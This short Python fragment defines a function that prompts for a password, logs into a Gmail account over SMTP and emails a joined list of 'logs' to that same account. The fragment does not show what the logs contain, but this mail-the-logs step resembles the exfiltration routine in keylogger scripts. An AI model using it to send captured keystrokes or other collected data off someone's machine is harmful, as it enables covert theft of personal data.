def gmail():
	email = "GMAIL_ACCOUNT"
	password = getpass.getpass(prompt=f'passwordTo_{email}: ', stream=None)
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.login(email, password)
	msg = "".join(logs)
	server.sendmail(email, email, msg)